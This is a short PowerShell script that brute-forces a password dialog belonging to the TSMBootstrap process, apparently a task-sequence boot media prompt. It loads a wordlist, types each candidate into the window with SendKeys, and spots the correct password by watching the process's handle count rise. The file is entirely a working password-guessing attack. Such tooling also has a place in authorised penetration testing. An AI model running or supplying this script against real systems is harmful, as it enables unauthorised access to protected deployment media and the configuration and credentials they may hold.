$originalp = get-process -name TSMBootstrap
$vb = New-Object -ComObject wscript.shell
$vb.AppActivate("Task")
$w = [System.Windows.Forms.SendKeys]

$pwfile = get-content .\words.txt

echo "Number of passwords loaded: $($pwfile.count)"

$stime = [System.Diagnostics.Stopwatch]::StartNew()

$attempts = 0

foreach ($pw in $pwfile){
	$w::SendWait($pw)
	$w::SendWait("%n")
	$attempts++
	if($attempts % 1000 -eq 0){
		$ct = $stime.Elapsed
		echo "Elapsed:$ct Attempted: $attempts CurrentPassword: $pw"
	}
	#Start-Sleep -Milliseconds 2
	if ((get-process -name TSMBootstrap).Handles -gt ($originalp.Handles + 10)){
		$prevPW = $pwfile | Select-String -CaseSensitive -Pattern $pw -Context 2,0
		echo "Password: $pw`nOr Previous Passwords: `n$prevPW"
		$stime.Stop()
		Break
	}else{
		#Start-Sleep -Milliseconds 1
		$w::SendWait("{Enter}")
	}
}

write-host "Ran for: $($stime.Elapsed)"
